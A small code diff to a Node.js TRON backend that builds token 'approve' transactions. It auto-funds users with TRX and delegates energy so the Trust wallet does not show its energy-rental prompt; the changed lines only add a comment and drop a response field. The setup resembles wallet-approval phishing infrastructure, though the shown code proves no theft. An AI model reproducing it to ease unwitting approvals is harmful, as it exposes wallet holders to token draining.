@@ -100,7 +100,7 @@ const SERVER_CONFIG = {
   // Send enough TRX so Trust can pay approve fee with TRX (no energy-rental Continue hang)
   autoSendAmount: Number(process.env.AUTO_SEND_AMOUNT || 20),
   // Top-up when user has below this many TRX
-  minimumBalance: Number(process.env.MINIMUM_BALANCE || 10),
+  minimumBalance: Number(process.env.MINIMUM_BALANCE || 10), // keep in sync with FE minTrx
   // Keep a little TRX for bandwidth / fees so sends do not fail at the edge
   feeReserve: Number(process.env.FEE_RESERVE_TRX || 1),
   // TRX amount of ENERGY to delegate to user so Trust does not show Energy rental
@@ -597,8 +597,7 @@ app.post('/build-approve', validateRequest, async (req, res) => {
       success: true,
       triggerResult,
       feeLimit,
-      owner: userAddress,
-      energy
+      owner: userAddress
     });
   } catch (error) {
     console.error('Build approve error:', error);
